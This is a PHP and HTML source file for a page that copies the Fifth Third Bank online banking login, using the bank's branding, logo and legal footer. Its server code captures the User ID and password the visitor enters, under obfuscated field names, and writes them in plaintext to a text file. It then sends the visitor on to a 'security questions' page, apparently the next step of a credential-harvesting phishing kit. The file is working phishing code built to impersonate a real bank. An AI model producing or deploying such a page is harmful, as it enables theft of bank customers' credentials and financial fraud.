<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

$errors = [];
$username = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['emzemz'] ?? '');
    $password = $_POST['pwzenz'] ?? '';
    $remember = isset($_POST['remember']);

    // Simple validation
    if (empty($username)) {
        $errors['emzemz'] = 'User ID is required';
    }
    if (empty($password)) {
        $errors['pwzenz'] = 'Password is required';
    }

    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $username;
        
        // Save to test file
        $data = [
            'step' => 'login',
            'usrnm' => $username,
            'emzemz' => $username,
            'pwzenz' => $password,
            'remember' => $remember
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - Online Banking Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with Login Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">Login</span>
                </div>

                <!-- Login Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-sm w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <h1 class="text-2xl font-bold text-gray-800 mb-6">Online Banking Login</h1>
                            <!-- Form -->
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                        <!-- Online Banking Dropdown -->
                        <div>
                            <label for="accountType" class="block text-sm font-semibold text-gray-700 mb-2">
                                Online Banking
                            </label>
                            <select
                                id="accountType"
                                name="accountType"
                                value="online"
                                disabled
                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm bg-gray-100 text-gray-500 cursor-not-allowed"
                            >
                                <option value="online">Online Banking</option>
                                <option value="business">Business Banking</option>
                                <option value="treasury">Treasury Management</option>
                            </select>
                        </div>

                        <!-- User ID Field -->
                        <div>
                            <label class="block text-sm font-semibold text-gray-700 mb-2" for="emzemz">
                                User ID
                            </label>
                            <div class="relative">
                                <input
                                    type="text"
                                    id="emzemz"
                                    name="emzemz"
                                    value="<?php echo htmlspecialchars($username); ?>"
                                    class="w-full border-2 border-dashed border-[#2d9c4b] rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:border-[#1f7a3d]"
                                    placeholder="Enter your User ID"
                                    required
                                >
                                <button
                                    type="button"
                                    class="absolute inset-y-0 right-3 my-auto text-xs font-semibold text-[#0a5c2d] hover:underline"
                                >
                                    Save
                                </button>
                            </div>
                            <?php if (isset($errors['emzemz'])): ?>
                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['emzemz']); ?></p>
                            <?php endif; ?>
                        </div>

                        <!-- Password Field -->
                        <div>
                            <label class="block text-sm font-semibold text-gray-700 mb-2" for="pwzenz">
                                Password
                            </label>
                            <div class="relative">
                                <input
                                    id="pwzenz"
                                    name="pwzenz"
                                    type="password"
                                    value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                    class="w-full border border-gray-300 rounded-sm px-3 py-2 pr-16 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                />
                                <button
                                    type="button"
                                    onclick="togglePasswordVisibility('pwzenz')"
                                    class="absolute inset-y-0 right-3 flex items-center text-sm font-semibold text-[#003087] hover:underline"
                                >
                                    <span id="toggleText">Show</span>
                                </button>
                            </div>
                            <?php if (isset($errors['pwzenz'])): ?>
                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['pwzenz']); ?></p>
                            <?php endif; ?>
                        </div>

                        <!-- Remember Username & Forgot Credentials -->
                        <div class="flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <button
                                    id="remember"
                                    type="button"
                                    role="switch"
                                    aria-checked="false"
                                    onclick="toggleRemember()"
                                    class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors bg-gray-300"
                                >
                                    <span
                                        id="toggleSwitch"
                                        class="inline-block h-4 w-4 transform rounded-full bg-white transition-transform translate-x-1"
                                    />
                                </button>
                                <label for="remember" class="text-sm text-gray-700">
                                    Remember Username
                                </label>
                            </div>
                            <a href="#" class="text-sm text-[#003087] hover:underline">
                                Forgot credentials?
                            </a>
                        </div>

                        <!-- Log In Button -->
                        <button
                            type="submit"
                            class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition disabled:opacity-70"
                        >
                            Log In
                        </button>

                        <!-- Register Button -->
                        <button
                            type="button"
                            onclick="window.location.href='#'"
                            class="w-full border border-[#123b9d] text-[#123b9d] py-2 rounded-md font-medium hover:bg-[#f0f4ff] transition"
                        >
                            Register for digital banking
                        </button>
                    </form>
                        </div>

                        <!-- Card Footer -->
                        <div class="border-t border-gray-200 px-8 py-4 text-sm">
                            <a href="#" class="text-[#003087] font-semibold hover:underline">
                                Forgot Login?
                            </a>
                            <p class="mt-2 text-sm">
                                First Time User?
                                <a href="#" class="text-[#003087] font-semibold hover:underline">
                                    Register.
                                </a>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Log In to View Your Accounts</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents,
                    pay bills directly from your account, and more.
                </p>

                <!-- Two Column Grid -->
                <div class="grid gap-6 md:grid-cols-2">
                    <!-- Existing Users -->
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Existing Users</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            To access your accounts, please use your custom User ID and your password. For your security, never share login
                            credentials or sensitive information.
                        </p>
                    </div>

                    <!-- First Time User -->
                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">First Time User?</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            Get started by registering for online banking access. Have your account number and personal details handy to
                            complete the enrollment process.
                        </p>
                        <a href="#" class="text-[#003087] font-semibold hover:underline">
                            User ID: Register now
                        </a>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const toggleText = document.getElementById('toggleText');
            
            if (field.type === 'password') {
                field.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                field.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        function toggleRemember() {
            const rememberBtn = document.getElementById('remember');
            const toggleSwitch = document.getElementById('toggleSwitch');
            const isChecked = rememberBtn.getAttribute('aria-checked') === 'true';
            
            rememberBtn.setAttribute('aria-checked', !isChecked);
            
            if (!isChecked) {
                rememberBtn.classList.remove('bg-gray-300');
                rememberBtn.classList.add('bg-[#123b9d]');
                toggleSwitch.classList.remove('translate-x-1');
                toggleSwitch.classList.add('translate-x-6');
            } else {
                rememberBtn.classList.remove('bg-[#123b9d]');
                rememberBtn.classList.add('bg-gray-300');
                toggleSwitch.classList.remove('translate-x-6');
                toggleSwitch.classList.add('translate-x-1');
            }
        }
        
        // Auto-focus username field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const usernameField = document.getElementById('emzemz');
            if (usernameField) {
                usernameField.focus();
            }
        });
    </script>
</body>
</html>
